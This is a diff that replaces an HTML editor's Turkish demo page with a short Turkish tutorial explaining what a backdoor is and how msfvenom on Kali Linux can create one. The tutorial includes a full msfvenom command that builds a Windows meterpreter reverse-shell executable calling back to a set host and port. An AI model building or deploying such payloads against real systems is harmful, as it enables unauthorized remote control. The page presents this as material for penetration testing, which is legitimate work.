@@ -1,19 +1,32 @@
-<h3><span>Buraya tıklayın</span> bu metni d&uuml;zenlemek i&ccedil;in, veya belgenizi HTML&rsquo;e d&ouml;n&uuml;şt&uuml;rmek i&ccedil;in buraya yapıştırın 😁</h3>
-<p><img src="/ed.png" alt="Ed" /><strong>Bu demo, bu edit&ouml;r&uuml;n &ouml;zelliklerini test etmenizi sağlar. Alanlardan birine yazın ve diğerinin ger&ccedil;ek zamanlı olarak değişmesini g&ouml;r&uuml;n! </strong></p>
-<p><strong>Temizlik se&ccedil;eneklerini ayarlayın ve tıklayın <span>▼ Temizle </span></strong></p>
-<p>Edit&ouml;rlerden herhangi biriyle &ccedil;alışın ve diğerinin ger&ccedil;ek zamanlı olarak değiştiğini g&ouml;r&uuml;n:</p>
-<table>
-<thead>
-<tr>
-<td><span>Sola </span>: &Ouml;n izleme</td>
-<td><span>Sağa&nbsp;</span>: Kaynak kodu</td>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Yayınladığınızda belgenizin nasıl g&ouml;r&uuml;neceğini &ouml;nizleyin.</td>
-<td>S&ouml;zdizimi vurgulanmış HTML kodunu ayarlayın.</td>
-</tr>
-</tbody>
-</table>
-<p>G&ouml;z atın <a target="_blank" rel="nofollow noopener" href="https://pranx.com/">Pranx.com</a> g&uuml;zel online şakalar i&ccedil;in.</p>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Backdoor Nedir? Ne işe yarar?</title>
+    <style>
+        /* İsteğe bağlı stil ayarları */
+        body {
+            font-family: Arial, sans-serif;
+            color: #d3d3d3;
+            background-color: rgba(0, 0, 0, 0.7);
+            /*padding: 15px;*/
+        }
+        h1 {
+            color: #b0b0b0;
+        }
+    </style>
+</head>
+<body>
+   <h1>Backdoor Nedir? Ne işe yarar?</h1>
+<p>Backdoor, bir sistemde yetkisiz erişim sağlamak amacıyla kullanılan bir t&uuml;r zararlı yazılımdır. Bu t&uuml;r yazılımlar, genellikle bir bilgisayar veya ağ &uuml;zerindeki g&uuml;venlik a&ccedil;ıklarından yararlanarak gizli bir erişim kanalı oluşturur. Bu erişim kanalı, sistem y&ouml;neticileri veya kullanıcılar tarafından tespit edilmeden dışarıdan erişim sağlanmasını m&uuml;mk&uuml;n kılar.</p>
+<p>Backdoor'lar &ccedil;eşitli şekillerde olabilir; bazıları fiziksel olarak bilgisayara y&uuml;klenirken, diğerleri ağ &uuml;zerinden uzaktan y&uuml;klenir ve &ccedil;alıştırılır. Y&uuml;klenmesinin ardından, backdoor'lar genellikle k&ouml;t&uuml; niyetli kişilerin sistem &uuml;zerinde tam yetki sahibi olmasını ve &ccedil;eşitli zararlı işlemler ger&ccedil;ekleştirmesini sağlar.</p>
+<p>Kali Linux ile backdoor oluşturma işlemi, genellikle g&uuml;venlik testleri ve ağ penetrasyon testleri i&ccedil;in yapılır. Ancak, bu t&uuml;r işlemleri sadece yasal ve etik &ccedil;er&ccedil;evede ger&ccedil;ekleştirmek &ouml;nemlidir.</p>
+<ol>
+<li><strong>Aracın Se&ccedil;imi:</strong> Kali Linux &uuml;zerinde backdoor oluşturmak i&ccedil;in kullanılabilecek &ccedil;eşitli ara&ccedil;lar bulunmaktadır. En pop&uuml;ler ara&ccedil;lardan biri <code>msfvenom</code>&rsquo;dur. <code>msfvenom</code>, Metasploit Framework&rsquo;&uuml;n bir par&ccedil;asıdır ve farklı t&uuml;rde backdoor&rsquo;lar oluşturmanıza imkan tanır.</li>
+<li><strong>Payload Oluşturma:</strong><code>msfvenom</code> kullanarak bir payload (y&uuml;k) oluşturabilirsiniz. Bu payload, sistemde &ccedil;alıştırıldığında bir geri d&ouml;n&uuml;ş (reverse shell) veya diğer zararlı işlevleri ger&ccedil;ekleştirecek şekilde tasarlanmıştır. Aşağıda basit bir <code>msfvenom</code> komutu &ouml;rneği verilmiştir:</li>
+</ol>
+<pre><span><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe &gt; backdoor.exe</code></span></pre>
+     
+</body>
+</html>
